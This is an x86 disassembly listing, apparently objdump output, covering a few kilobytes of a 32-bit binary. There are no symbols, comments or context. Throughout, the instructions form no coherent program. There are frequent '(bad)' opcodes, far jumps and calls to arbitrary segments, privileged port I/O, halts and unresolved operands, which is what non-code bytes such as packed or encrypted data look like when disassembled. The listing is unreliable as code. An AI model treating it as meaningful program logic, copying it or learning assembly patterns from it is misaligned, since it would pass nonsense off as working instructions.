  419b7d:	adc    esp,DWORD PTR [ebx+0x2b]
  419b80:	or     ebp,ecx
  419b82:	es xor al,0x1f
  419b85:	sbb    al,0xd
  419b87:	push   esi
  419b88:	jns    0x419bf4
  419b8a:	call   0x1205547b
  419b8f:	js     0x419bac
  419b91:	cmp    eax,0xc656a723
  419b96:	mov    edx,0x367f5c3
  419b9b:	xchg   DWORD PTR [ebp-0x53],esi
  419b9e:	aaa    
  419b9f:	xor    al,0x68
  419ba1:	lahf   
  419ba2:	mov    eax,ds:0xf0a786ee
  419ba7:	dec    esi
  419ba8:	test   BYTE PTR [ebx],al
  419baa:	sub    al,0x1a
  419bac:	(bad)  
  419bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bae:	sbb    BYTE PTR [ebx-0x50],dh
  419bb1:	pop    ds
  419bb2:	jb     0x419bd8
  419bb4:	mov    ds:0x7e9a8a3d,eax
  419bb9:	inc    edx
  419bba:	(bad)  
  419bbb:	cdq    
  419bbc:	dec    edi
  419bbd:	daa    
  419bbe:	jg     0x419bae
  419bc0:	jno    0x419bdd
  419bc2:	inc    ebp
  419bc3:	xchg   eax,esp
  419bc5:	retf   
  419bc6:	xor    al,0x99
  419bc8:	and    DWORD PTR [ecx],ebx
  419bca:	imul   ebx,edx,0xffffffbd
  419bcd:	in     eax,0xe3
  419bcf:	sahf   
  419bd0:	loopne 0x419c08
  419bd2:	out    0x45,al
  419bd4:	ffree  st(5)
  419bd6:	and    eax,0x60db29e1
  419bdb:	mov    esi,0xa5abdc27
  419be0:	retf   
  419be1:	test   DWORD PTR [eax],0x7e08497c
  419be7:	lods   eax,DWORD PTR ds:[esi]
  419be8:	inc    esp
  419be9:	add    eax,0x157669d4
  419bee:	cmp    eax,0x61da349c
  419bf3:	xchg   edx,eax
  419bf4:	mov    bh,0x8f
  419bf6:	pop    ebp
  419bf7:	scas   eax,DWORD PTR es:[edi]
  419bf8:	(bad)  
  419bf9:	xchg   esp,eax
  419bfa:	sbb    al,0x59
  419bfc:	inc    esi
  419bfd:	cmp    BYTE PTR [edi-0x67],ch
  419c00:	retf   0x1122
  419c03:	xor    eax,0x3a4c02ba
  419c08:	xlat   BYTE PTR ds:[ebx]
  419c09:	icebp  
  419c0a:	adc    ah,BYTE PTR [ebx]
  419c0c:	push   es
  419c0d:	sub    dl,ch
  419c0f:	ins    BYTE PTR es:[edi],dx
  419c10:	outs   dx,BYTE PTR ds:[esi]
  419c11:	or     eax,0x927c21dd
  419c16:	mov    esi,0x2767fde0
  419c1b:	xchg   esi,esi
  419c1d:	mov    ebx,0x7ca93f5
  419c22:	inc    edi
  419c23:	inc    ecx
  419c24:	add    al,dh
  419c26:	inc    edi
  419c27:	add    DWORD PTR [eax],esi
  419c29:	push   0xc59966cf
  419c2e:	outs   dx,BYTE PTR ds:[esi]
  419c2f:	(bad)  
  419c30:	sub    ecx,ecx
  419c32:	add    eax,0x5aa9f17d
  419c37:	cmp    al,0xf3
  419c39:	cmp    ecx,DWORD PTR [esi+0x59156c5e]
  419c3f:	mov    cl,BYTE PTR [edi-0x4f540b2]
  419c45:	ja     0x419c9f
  419c47:	loop   0x419c8b
  419c49:	pop    ebx
  419c4a:	(bad)  
  419c4b:	aam    0xb2
  419c4d:	add    eax,0x33c17be8
  419c52:	mov    eax,0x2eb7ab0f
  419c57:	sbb    BYTE PTR [eax],0xb5
  419c5a:	leave  
  419c5b:	ja     0x419cad
  419c5d:	cmp    edi,DWORD PTR [ebx]
  419c5f:	daa    
  419c60:	out    0xcd,al
  419c62:	repnz inc esp
  419c64:	xchg   edx,eax
  419c65:	hlt    
  419c66:	in     eax,dx
  419c67:	add    DWORD PTR [esi],0x7ecfc3f7
  419c6d:	daa    
  419c6e:	repz sti 
  419c70:	shl    BYTE PTR [eax],0x5a
  419c73:	das    
  419c74:	mov    esi,es
  419c76:	and    BYTE PTR ss:[edx],ah
  419c79:	adc    cl,ah
  419c7b:	mov    ebp,0x33e9fac2
  419c80:	sbb    DWORD PTR [ebx-0x182ecef4],esp
  419c86:	enter  0x6d5f,0x4f
  419c8a:	cmp    dh,BYTE PTR [edx-0xc]
  419c8d:	and    al,0x25
  419c8f:	mov    ebx,0x6c928ab
  419c94:	mov    esi,DWORD PTR [esi+0x1b]
  419c97:	into   
  419c98:	stos   DWORD PTR es:[edi],eax
  419c99:	jo     0x419cc9
  419c9b:	in     al,0x5d
  419c9d:	xchg   edx,eax
  419c9e:	fst    QWORD PTR [edi+0x19]
  419ca1:	jo     0x419c48
  419ca3:	sub    DWORD PTR ds:0xc1b95843,ecx
  419ca9:	add    DWORD PTR [eax],esi
  419cab:	pusha  
  419cac:	icebp  
  419cad:	sbb    ebx,ebx
  419caf:	jmp    0xac02:0x8e46665f
  419cb6:	xchg   DWORD PTR [edx],edx
  419cb8:	xor    ch,BYTE PTR [eax-0x12]
  419cbb:	cli    
  419cbc:	sub    eax,0x5839ca78
  419cc1:	xor    eax,0x8c8b96af
  419cc6:	cmp    DWORD PTR [esi],ecx
  419cc8:	xchg   DWORD PTR [eax-0x23764ce2],esp
  419cce:	jnp    0x419d4b
  419cd0:	lds    ebx,FWORD PTR [eax]
  419cd2:	mov    al,BYTE PTR [esi]
  419cd4:	mov    al,ds:0xa20fb9b8
  419cd9:	test   eax,0x5533ccaf
  419cde:	adc    ebx,DWORD PTR ds:0x35741a00
  419ce4:	nop
  419ce5:	sar    DWORD PTR [ecx],0x90
  419ce8:	sbb    edi,DWORD PTR [ebx+0x40]
  419ceb:	or     al,0xfa
  419ced:	mov    ah,0xa
  419cef:	in     eax,dx
  419cf0:	in     eax,0x4f
  419cf2:	shl    BYTE PTR es:[edi-0x761689a8],0x7c
  419cfa:	xor    al,0x45
  419cfc:	cmp    al,0x1f
  419cfe:	jp     0x419ce1
  419d00:	(bad)  
  419d01:	scas   al,BYTE PTR es:[edi]
  419d02:	les    esp,FWORD PTR [edi+0x39f998ed]
  419d08:	adc    esp,DWORD PTR [ebx]
  419d0a:	je     0x419d1a
  419d0c:	adc    DWORD PTR [ebx],esi
  419d0e:	or     eax,0xd90f6de
  419d13:	jbe    0x419cd5
  419d15:	xchg   edx,eax
  419d16:	stc    
  419d17:	and    cl,BYTE PTR [edi+eax*2]
  419d1a:	mov    BYTE PTR [eax-0x42],0xa2
  419d1e:	adc    cl,BYTE PTR [eax]
  419d20:	mov    cl,0x78
  419d22:	inc    eax
  419d23:	xor    DWORD PTR [eax],edi
  419d25:	je     0x419d0a
  419d27:	cwde   
  419d28:	mov    ah,0x99
  419d2a:	aas    
  419d2b:	test   al,0xd2
  419d2d:	push   es
  419d2e:	std    
  419d2f:	stc    
  419d30:	xor    al,0x98
  419d32:	push   0x777de42f
  419d37:	shl    BYTE PTR [esi+0x5f],1
  419d3a:	out    0xa3,al
  419d3c:	(bad)  
  419d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3e:	repz xor ebx,esp
  419d41:	imul   edx,DWORD PTR [ecx-0x2e],0x6b
  419d45:	cmp    al,bh
  419d47:	adc    al,0x91
  419d49:	and    al,0xb3
  419d4b:	cmp    dh,BYTE PTR [ebx+0x3]
  419d4e:	push   edi
  419d4f:	sahf   
  419d50:	push   ebx
  419d51:	cmc    
  419d52:	retf   0x6ea4
  419d55:	cmp    DWORD PTR [edx-0x71],esi
  419d58:	dec    edi
  419d59:	call   0xdd4a:0x6f6676ed
  419d60:	std    
  419d61:	sbb    al,0x54
  419d63:	inc    ebp
  419d64:	push   ecx
  419d65:	inc    esp
  419d66:	fisubr DWORD PTR [edi]
  419d68:	hlt    
  419d69:	xchg   edi,eax
  419d6a:	pop    ebp
  419d6b:	dec    esp
  419d6c:	imul   ebx,DWORD PTR [ebp+0x25ed5d3c],0x15a971c
  419d76:	lods   eax,DWORD PTR ds:[esi]
  419d77:	cwde   
  419d78:	or     eax,0x156d6c80
  419d7d:	ret    0xde9c
  419d80:	outs   dx,BYTE PTR ds:[esi]
  419d81:	and    al,0x5d
  419d83:	mov    edx,edi
  419d85:	sub    DWORD PTR [edi+0x6e],0x6ba44046
  419d8c:	sub    esi,0x2d
  419d8f:	out    0xb3,eax
  419d91:	push   cs
  419d92:	pushf  
  419d93:	hlt    
  419d94:	or     al,0xaa
  419d96:	loope  0x419d18
  419d98:	mov    al,0x51
  419d9a:	push   es
  419d9b:	in     eax,0xc5
  419d9d:	and    BYTE PTR ds:0x5b780b86,0xc1
  419da4:	jne    0x419d32
  419da6:	and    ch,cl
  419da8:	dec    edi
  419da9:	lahf   
  419daa:	or     dh,BYTE PTR [edi+edi*2+0x5f]
  419dae:	xchg   ecx,eax
  419daf:	jmp    0xe419:0xe2708ea5
  419db6:	leave  
  419db7:	jae    0x419daa
  419db9:	jmp    0x1a9b:0x466590d5
  419dc0:	mov    al,0xc7
  419dc2:	out    dx,al
  419dc3:	call   0xfbd7:0xb4a7ea67
  419dca:	adc    DWORD PTR [edx+0x37],eax
  419dcd:	stos   DWORD PTR es:[edi],eax
  419dce:	or     BYTE PTR [ebx],dl
  419dd0:	retf   0x7cce
  419dd3:	inc    eax
  419dd4:	xor    BYTE PTR [esi],dl
  419dd6:	cmp    DWORD PTR [ecx+0x28f1df0c],ecx
  419ddc:	mov    dh,0xe9
  419dde:	mov    al,ds:0x86dfe828
  419de3:	xchg   edx,eax
  419de4:	das    
  419de5:	test   al,0xe9
  419de7:	xor    eax,0xe5803991
  419dec:	xchg   esi,eax
  419ded:	aas    
  419dee:	(bad)  
  419def:	ror    BYTE PTR [esi+0x1063a049],1
  419df5:	push   ebp
  419df6:	outs   dx,DWORD PTR ds:[esi]
  419df7:	ret    
  419df8:	std    
  419df9:	add    DWORD PTR [ebp+0x2e27c8a4],0x17fd7204
  419e03:	add    eax,0xc4353731
  419e08:	popf   
  419e09:	sbb    eax,0xad763c28
  419e0e:	mov    al,ds:0x36e30074
  419e13:	test   BYTE PTR [edx-0x20],dh
  419e16:	pop    eax
  419e17:	and    ebx,eax
  419e19:	shl    BYTE PTR [ecx],1
  419e1b:	xchg   ebp,eax
  419e1c:	sub    al,0x67
  419e1e:	dec    ecx
  419e1f:	sar    BYTE PTR [edi-0x38],1
  419e22:	sub    BYTE PTR [edx],dl
  419e24:	(bad)  
  419e25:	icebp  
  419e26:	leave  
  419e27:	cmp    al,0x2f
  419e29:	inc    edx
  419e2a:	test   al,0x83
  419e2c:	mov    eax,0xe396b35f
  419e31:	jbe    0x419de6
  419e33:	add    edi,eax
  419e35:	push   cs
  419e36:	xchg   edi,eax
  419e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e38:	mov    BYTE PTR [edx-0x6a12cf84],ch
  419e3e:	int    0xac
  419e40:	gs stos DWORD PTR es:[edi],eax
  419e42:	not    ebx
  419e44:	inc    edi
  419e45:	xchg   ebx,eax
  419e46:	dec    ebp
  419e47:	imul   BYTE PTR [esp+edx*4+0x4052ffa3]
  419e4e:	pop    ebp
  419e4f:	outs   dx,BYTE PTR ds:[esi]
  419e50:	mov    al,0x5e
  419e52:	js     0x419e6a
  419e54:	or     DWORD PTR [edi],edx
  419e56:	mov    WORD PTR [edx-0x76],fs
  419e59:	jecxz  0x419eda
  419e5b:	xor    dh,al
  419e5d:	inc    esp
  419e5e:	pop    ds
  419e5f:	data16 sub al,0x81
  419e62:	pop    ebp
  419e63:	jmp    0xba15:0x679d8166
  419e6a:	es sahf 
  419e6c:	ins    DWORD PTR es:[edi],dx
  419e6d:	outs   dx,BYTE PTR ds:[esi]
  419e6e:	pusha  
  419e6f:	sub    DWORD PTR [eax-0x44392953],esi
  419e75:	ret    
  419e76:	stos   DWORD PTR es:[edi],eax
  419e77:	push   edx
  419e78:	xchg   esp,eax
  419e79:	gs push ecx
  419e7b:	dec    BYTE PTR [ebp+0x6a]
  419e7e:	popf   
  419e7f:	lahf   
  419e80:	pop    ds
  419e81:	add    al,0xea
  419e83:	adc    ch,dl
  419e85:	sbb    ch,ch
  419e87:	test   al,0x85
  419e89:	xchg   ebx,eax
  419e8a:	hlt    
  419e8b:	cli    
  419e8c:	or     ah,0x88
  419e8f:	jl     0x419e22
  419e91:	mov    esp,DWORD PTR [ebx-0x466bc754]
  419e97:	mov    edx,?
  419e99:	jmp    0x92223ac8
  419e9e:	sbb    ah,dl
  419ea0:	mov    ds:0xf88d044c,eax
  419ea5:	inc    ecx
  419ea6:	stos   BYTE PTR es:[edi],al
  419ea7:	lahf   
  419ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea9:	ins    BYTE PTR es:[edi],dx
  419eaa:	inc    ebx
  419eab:	pcmpeqd mm4,QWORD PTR [esp+ebp*2+0x3dd3887]
  419eb3:	jo     0x419e8e
  419eb5:	sub    bl,bh
  419eb7:	fimul  DWORD PTR [esp+eax*1+0xf]
  419ebb:	(bad)  
  419ebc:	outs   dx,DWORD PTR ds:[esi]
  419ebd:	mov    eax,ds:0x70954779
  419ec2:	fnstenv [eax+0x7e435763]
  419ec8:	or     ebx,ecx
  419eca:	clc    
  419ecb:	(bad)  
  419ecc:	out    dx,eax
  419ecd:	inc    ecx
  419ece:	or     BYTE PTR [ebx],al
  419ed0:	or     DWORD PTR [ecx+0xeb724f5],eax
  419ed6:	imul   edx,eax,0x53a88324
  419edc:	popf   
  419edd:	loope  0x419e72
  419edf:	sbb    bl,0x4
  419ee2:	xchg   DWORD PTR [esi+0x22],eax
  419ee5:	mov    eax,ds:0x77e170c
  419eea:	fwait
  419eeb:	mov    cl,0x18
  419eed:	lock mov gs,ecx
  419ef0:	das    
  419ef1:	in     eax,dx
  419ef2:	mov    dl,0x2a
  419ef4:	jno    0x419f48
  419ef6:	shl    bl,cl
  419ef8:	ret    
  419ef9:	add    eax,0x28e2b641
  419efe:	cmp    al,0x7f
  419f00:	adc    ebx,DWORD PTR [esi-0x7b]
  419f03:	mov    es,WORD PTR gs:[edx+esi*1]
  419f07:	(bad)  
  419f09:	in     eax,0xb0
  419f0b:	jbe    0x419f7b
  419f0d:	cmc    
  419f0e:	jns    0x419ee6
  419f10:	mov    BYTE PTR [edx+0x7f851bc5],bh
  419f16:	nop
  419f17:	push   ds
  419f18:	mov    DWORD PTR [ebp+edi*4-0x2],edi
  419f1c:	and    DWORD PTR [ebx+0x10dce5b0],eax
  419f22:	push   es
  419f23:	xchg   DWORD PTR [ebp+eiz*1+0x1cd0ad4b],esp
  419f2a:	cmp    BYTE PTR [esi+0xb],cl
  419f2d:	loope  0x419efa
  419f2f:	add    eax,0x10843539
  419f34:	pop    esp
  419f35:	ds fabs 
  419f38:	jno    0x419f25
  419f3a:	std    
  419f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f3c:	ins    DWORD PTR es:[edi],dx
  419f3d:	stos   BYTE PTR es:[edi],al
  419f3e:	jno    0x419f09
  419f40:	add    eax,ebx
  419f42:	inc    eax
  419f43:	in     eax,dx
  419f44:	pop    edx
  419f45:	jp     0x419ed4
  419f47:	out    0x87,al
  419f49:	leave  
  419f4a:	addr16 mov al,0xda
  419f4d:	inc    eax
  419f4e:	lea    esi,[esi+ebx*2-0x3b8c55ee]
  419f55:	in     al,dx
  419f56:	(bad)  
  419f57:	stc    
  419f58:	rcr    DWORD PTR [ebx+eiz*4],cl
  419f5b:	inc    ecx
  419f5c:	add    esi,DWORD PTR [edx+0x25]
  419f5f:	xor    bh,BYTE PTR [ecx-0x7d69181e]
  419f65:	or     dl,BYTE PTR [esi]
  419f67:	test   dh,dl
  419f69:	push   es
  419f6a:	int    0x10
  419f6c:	lods   eax,DWORD PTR ds:[esi]
  419f6d:	into   
  419f6e:	ror    BYTE PTR [esi],cl
  419f70:	icebp  
  419f71:	dec    ebx
  419f72:	sub    eax,esi
  419f74:	or     BYTE PTR [eax],dl
  419f76:	fadd   QWORD PTR [ebx]
  419f78:	jbe    0x419f27
  419f7a:	dec    ebx
  419f7b:	sbb    al,0xa5
  419f7d:	lods   eax,DWORD PTR ds:[esi]
  419f7e:	aas    
  419f7f:	pop    es
  419f80:	sahf   
  419f81:	xchg   esp,eax
  419f82:	and    DWORD PTR [eax+0x17bb1328],0x6aa6a65b
  419f8c:	sub    al,BYTE PTR [edx]
  419f8e:	addr16 and al,0xc5
  419f91:	push   eax
  419f92:	jge    0x419fee
  419f94:	push   es
  419f95:	das    
  419f96:	rcl    DWORD PTR [eax-0x175d5189],1
  419f9c:	push   es
  419f9d:	mov    ebp,DWORD PTR [edi+0x6e]
  419fa0:	mov    ds:0x444e83e,eax
  419fa5:	jge    0x419f2b
  419fa7:	xchg   BYTE PTR [esi],al
  419fa9:	pop    esp
  419faa:	dec    esi
  419fab:	add    eax,0xa99c61c
  419fb0:	pop    esi
  419fb1:	push   es
  419fb2:	cmp    al,0x6e
  419fb4:	ret    
  419fb5:	clc    
  419fb6:	ret    0xcfa8
  419fb9:	mov    al,0xf1
  419fbb:	xchg   DWORD PTR [ebx+0x46ac6bdf],esi
  419fc1:	test   DWORD PTR [edx-0x41f125e5],esp
  419fc7:	sub    eax,0xb0bd51d6
  419fcc:	outs   dx,BYTE PTR ds:[esi]
  419fcd:	sbb    al,0x5c
  419fcf:	and    BYTE PTR [eax+0x633aa3a8],bl
  419fd5:	pop    ds
  419fd6:	(bad)  
  419fd7:	adc    BYTE PTR [eax+0x3e0ad168],0xc9
  419fde:	and    eax,0x68157fd5
  419fe3:	xor    cl,BYTE PTR [edx+0x5d87987e]
  419fe9:	sti    
  419fea:	xchg   esp,eax
  419feb:	mov    eax,ds:0xf760f679
  419ff0:	sbb    eax,0x98cf153a
  419ff5:	dec    edx
  419ff6:	mov    ecx,0xac2298b9
  419ffb:	pusha  
  419ffc:	les    edx,FWORD PTR [eax+0x25e30797]
  41a002:	adc    dh,BYTE PTR [eax+ebx*2-0x696ab67e]
  41a009:	sub    dh,dh
  41a00b:	jmp    0x419fed
  41a00d:	push   ss
  41a00e:	retf   0xb558
  41a011:	jmp    0x41a014
  41a013:	mov    ds:0x45a8eb42,eax
  41a018:	stos   DWORD PTR es:[edi],eax
  41a019:	dec    ecx
  41a01a:	dec    ecx
  41a01b:	jnp    0x41a03d
  41a01d:	pusha  
  41a01e:	repnz bound ecx,QWORD PTR [esi+0x25]
  41a022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a023:	adc    ebp,edi
  41a025:	jecxz  0x419fb7
  41a027:	js     0x41a098
  41a029:	in     al,0x86
  41a02b:	fxch   st(2)
  41a02d:	mul    BYTE PTR [eax]
  41a02f:	mov    al,0xef
  41a031:	and    eax,0x14f90b3e
  41a036:	jmp    0x5aff:0x5b5a380f
  41a03d:	mov    ecx,ecx
  41a03f:	inc    edi
  41a040:	fs leave 
  41a042:	loop   0x41a0ae
  41a044:	enter  0x2c4f,0x6c
  41a048:	fst    QWORD PTR [esi]
  41a04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a04b:	out    dx,eax
  41a04c:	inc    edi
  41a04d:	xor    eax,0xd142ec71
  41a052:	push   ebx
  41a053:	add    DWORD PTR [ebp+0x58],esp
  41a056:	int3   
  41a057:	jp     0x41a0b6
  41a059:	mov    ds:0xd05f73b2,eax
  41a05e:	rcl    BYTE PTR [edi],1
  41a060:	cmp    ah,bl
  41a062:	push   0xffffff9f
  41a064:	mov    al,0x76
  41a066:	frstor [edi]
  41a068:	lock retf 0xbc37
  41a06c:	adc    al,0x9
  41a06e:	mov    WORD PTR [esi+0x2e],?
  41a071:	cmp    bh,bh
  41a073:	jp     0x41a05f
  41a075:	mov    al,0x24
  41a077:	cld    
  41a078:	pop    eax
  41a079:	mov    ds:0x8361e06,eax
  41a07e:	inc    eax
  41a07f:	mov    WORD PTR [bx+di-0x6e],?
  41a083:	shl    BYTE PTR ds:0x32da27bb,0xae
  41a08a:	test   BYTE PTR [ecx+0x66c832ae],bh
  41a090:	add    BYTE PTR [ebp+0x6ed244e1],dl
  41a096:	imul   edx,DWORD PTR [eax-0x38eda82f],0x9f9fe90
  41a0a0:	arpl   sp,di
  41a0a2:	and    BYTE PTR [eax-0x78],0xe
  41a0a6:	inc    edx
  41a0a7:	test   DWORD PTR [eax],edx
  41a0a9:	fwait
  41a0aa:	or     DWORD PTR [esi+eiz*4+0x52],eax
  41a0ae:	in     eax,dx
  41a0af:	ret    0x8101
  41a0b2:	cmc    
  41a0b3:	imul   ecx,DWORD PTR [eax+edx*4],0xd2ec82f7
  41a0ba:	(bad)  
  41a0bb:	adc    ah,bl
  41a0bd:	nop
  41a0be:	and    BYTE PTR [eax-0x3767fc6d],dl
  41a0c4:	xchg   DWORD PTR ds:0x5e76b2b,edx
  41a0ca:	xlat   BYTE PTR ds:[ebx]
  41a0cb:	dec    edi
  41a0cc:	and    DWORD PTR [edi],esi
  41a0ce:	loope  0x41a054
  41a0d0:	jp     0x41a0a7
  41a0d2:	ss cld 
  41a0d4:	cmp    edi,DWORD PTR [edx+eax*8-0x3ce0525c]
  41a0db:	js     0x41a075
  41a0dd:	push   eax
  41a0de:	or     eax,0xcd8de256
  41a0e3:	cmp    al,0xa6
  41a0e5:	jb     0x41a0cf
  41a0e7:	mov    al,ds:0x764fb3a4
  41a0ec:	shl    BYTE PTR [edx+0x5dbd484b],1
  41a0f2:	(bad)  
  41a0f3:	mov    ah,0x21
  41a0f5:	into   
  41a0f6:	jbe    0x41a12b
  41a0f8:	pop    es
  41a0f9:	push   edi
  41a0fa:	in     al,dx
  41a0fb:	rol    DWORD PTR [ebx],1
  41a0fd:	mov    esi,0xb48432fe
  41a102:	mov    DWORD PTR [edi],esp
  41a104:	pop    ss
  41a105:	and    ah,cl
  41a107:	inc    ebp
  41a108:	fldenv [ecx-0x1c]
  41a10b:	push   ebp
  41a10c:	jecxz  0x41a0b0
  41a10e:	adc    ebx,DWORD PTR [ebx-0x10c3af39]
  41a114:	adc    DWORD PTR [edx-0x6c],ebp
  41a117:	popf   
  41a118:	mov    al,0x6
  41a11a:	scas   al,BYTE PTR es:[edi]
  41a11b:	or     al,0x85
  41a11d:	cmp    DWORD PTR [ebx],edx
  41a11f:	(bad)  
  41a120:	sti    
  41a121:	sti    
  41a122:	mov    ebx,0x7eb658a8
  41a127:	add    al,0x74
  41a129:	popa   
  41a12a:	js     0x41a16f
  41a12c:	jl     0x41a102
  41a12e:	idiv   BYTE PTR [esp-0x41387142]
  41a135:	add    ah,bl
  41a137:	add    eax,0xe003e73a
  41a13c:	cmp    ebp,DWORD PTR [esp+eiz*8]
  41a13f:	sahf   
  41a140:	(bad)  
  41a141:	test   eax,0xcab4531a
  41a146:	retf   
  41a147:	rol    dh,0xd0
  41a14a:	push   edi
  41a14b:	xor    eax,ebp
  41a14d:	test   al,0xe2
  41a14f:	aas    
  41a150:	sub    al,0x8f
  41a152:	jl     0x41a0f3
  41a154:	sub    esp,eax
  41a156:	pop    esp
  41a157:	add    edi,DWORD PTR [ecx-0xb]
  41a15a:	loope  0x41a1c5
  41a15c:	leave  
  41a15d:	pop    ss
  41a15e:	mov    ch,0x12
  41a160:	mov    bl,0x22
  41a162:	imul   ebx,ecx,0xffffffa6
  41a165:	mov    WORD PTR [ecx+0x5439fbe8],?
  41a16b:	pop    eax
  41a16c:	jmp    0x41a180
  41a16e:	inc    ecx
  41a16f:	stc    
  41a170:	and    DWORD PTR [edi+0x35e1661e],ecx
  41a176:	je     0x41a1de
  41a178:	cmp    esp,DWORD PTR [eax]
  41a17a:	in     al,dx
  41a17b:	lock out 0x8,eax
  41a17e:	xor    ecx,ebx
  41a180:	sbb    dl,BYTE PTR [edx+edi*4+0x1cc81c6]
  41a187:	jns    0x41a1f4
  41a189:	pop    esp
  41a18a:	imul   BYTE PTR [eax-0x29cfc525]
  41a190:	ror    DWORD PTR [ebx-0x5bbec2dd],1
  41a196:	add    eax,0x74
  41a199:	mov    cx,0xce2c
  41a19d:	pop    esi
  41a19e:	hlt    
  41a19f:	xchg   edx,eax
  41a1a0:	jmp    0x1cbcc1be
  41a1a5:	xchg   DWORD PTR [edi],esi
  41a1a7:	in     eax,dx
  41a1a8:	mov    dl,0x5
  41a1aa:	std    
  41a1ab:	mov    bl,0x3e
  41a1ad:	pusha  
  41a1ae:	stc    
  41a1af:	lock push ss
  41a1b1:	xchg   cl,bl
  41a1b3:	into   
  41a1b4:	es dec ebx
  41a1b6:	das    
  41a1b7:	pop    edi
  41a1b8:	and    ah,ch
  41a1ba:	mov    ds:0xcc4bdec3,eax
  41a1bf:	sahf   
  41a1c0:	js     0x41a22b
  41a1c2:	clc    
  41a1c3:	rol    BYTE PTR [ebp-0x5c],0x29
  41a1c7:	xor    al,0xe8
  41a1c9:	push   ss
  41a1ca:	pop    ebx
  41a1cb:	out    0xc6,al
  41a1cd:	cdq    
  41a1ce:	jmp    0x41a24a
  41a1d0:	retf   0xedc7
  41a1d3:	test   al,0xc4
  41a1d5:	push   cs
  41a1d6:	xor    BYTE PTR [edi+0x36],bh
  41a1d9:	sahf   
  41a1da:	mov    esp,0x720dc7de
  41a1df:	adc    eax,0x34c28db2
  41a1e4:	dec    edi
  41a1e5:	xor    ebx,edx
  41a1e7:	es dec edx
  41a1e9:	mov    al,0xea
  41a1eb:	fldcw  WORD PTR [esi]
  41a1ed:	sub    DWORD PTR [ebp-0x34f3d21d],esp
  41a1f3:	or     eax,0xaed6792
  41a1f8:	inc    eax
  41a1f9:	imul   ebp,DWORD PTR [ebx-0x78],0x9c8ac25c
  41a200:	adc    al,0x63
  41a202:	add    eax,DWORD PTR [edi]
  41a204:	pushf  
  41a205:	popf   
  41a206:	in     al,0x30
  41a208:	inc    esi
  41a209:	pusha  
  41a20a:	test   eax,0xdba50714
  41a20f:	(bad)  
  41a210:	out    0x23,al
  41a212:	inc    ebx
  41a213:	(bad)  
  41a214:	xlat   BYTE PTR ds:[ebx]
  41a215:	sub    edi,edi
  41a217:	inc    esi
  41a218:	cmp    DWORD PTR [ebx+ebp*1-0x1fb4c069],0x32f7f193
  41a223:	mov    bh,0x41
  41a225:	imul   bh
  41a227:	dec    ebx
  41a228:	cmp    cl,ah
  41a22a:	or     ecx,ebp
  41a22c:	jmp    0xd207:0x15b339e8
  41a233:	popf   
  41a234:	mov    ebp,0xb91075d6
  41a239:	in     al,0x70
  41a23b:	mov    dh,0x59
  41a23d:	fisttp DWORD PTR [ebx]
  41a23f:	pusha  
  41a240:	iret   
  41a241:	cmp    al,0x1a
  41a243:	jl     0x41a22d
  41a245:	stos   BYTE PTR es:[edi],al
  41a246:	fld    st(4)
  41a248:	and    BYTE PTR [esi],dl
  41a24a:	(bad)  
  41a24b:	or     BYTE PTR [ecx],ch
  41a24d:	adc    esp,DWORD PTR [eax]
  41a24f:	lahf   
  41a250:	jne    0x41a29f
  41a252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a253:	rcl    BYTE PTR [eax-0x1819fbc7],0xb1
  41a25a:	adc    al,0x81
  41a25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25d:	sub    ebx,esi
  41a25f:	mov    bl,0x1b
  41a261:	in     al,dx
  41a262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a263:	inc    eax
  41a264:	cld    
  41a265:	add    ch,BYTE PTR [edi-0x523667f5]
  41a26b:	jne    0x41a26f
  41a26d:	je     0x41a2cc
  41a26f:	repnz cld 
  41a271:	inc    esp
  41a272:	sub    bl,BYTE PTR [edi]
  41a274:	pop    ecx
  41a275:	rcr    cl,cl
  41a277:	xchg   esp,eax
  41a278:	addr16 rcr ch,1
  41a27b:	push   edx
  41a27c:	in     eax,dx
  41a27d:	out    dx,al
  41a27e:	push   esi
  41a27f:	mov    dl,0xb
  41a281:	test   al,0x38
  41a283:	repz sbb ebp,0xf4c3a2ad
  41a28a:	lods   al,BYTE PTR ds:[esi]
  41a28b:	pop    ss
  41a28c:	test   eax,0x49b35d44
  41a291:	pop    ebp
  41a292:	sbb    al,ah
  41a294:	sbb    eax,0xec0896d8
  41a299:	test   eax,0x5d43a07f
  41a29e:	fs push ebx
  41a2a0:	mov    ds:0x6ba4b3f5,eax
  41a2a5:	mov    edi,0xa87f875e
  41a2aa:	ss je  0x41a265
  41a2ad:	call   0xd95a:0x728e5c7f
  41a2b4:	mov    eax,ds:0x932c97fc
  41a2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ba:	imul   esp,ebp,0x53
  41a2bd:	test   al,0x63
  41a2bf:	push   esi
  41a2c0:	retf   0xcdc8
  41a2c3:	sbb    al,0xd1
  41a2c5:	inc    esp
  41a2c6:	leave  
  41a2c7:	inc    esi
  41a2c8:	cwde   
  41a2c9:	iret   
  41a2ca:	out    0x5,eax
  41a2cc:	or     edi,ebx
  41a2ce:	jmp    0xae0c:0xad8388f
  41a2d5:	add    edi,eax
  41a2d7:	dec    eax
  41a2d8:	out    0xdb,al
  41a2da:	stc    
  41a2db:	ja     0x41a2e2
  41a2dd:	jb     0x41a261
  41a2df:	in     al,dx
  41a2e0:	repnz std 
  41a2e2:	fadd   st,st(7)
  41a2e4:	push   ecx
  41a2e5:	aad    0xae
  41a2e7:	call   0x9460:0x833ba50
  41a2ee:	pop    ss
  41a2ef:	xchg   DWORD PTR [ecx+0x16],eax
  41a2f2:	imul   edi,esp,0x2e
  41a2f5:	in     eax,dx
  41a2f6:	clc    
  41a2f7:	outs   dx,BYTE PTR ds:[esi]
  41a2f8:	sub    al,0x3a
  41a2fa:	aad    0xef
  41a2fc:	repz leave 
  41a2fe:	retf   
  41a2ff:	out    dx,eax
  41a300:	js     0x41a299
  41a302:	or     bh,BYTE PTR fs:[edi+0x537caa04]
  41a309:	xchg   ecx,eax
  41a30a:	cli    
  41a30b:	jae    0x41a2bc
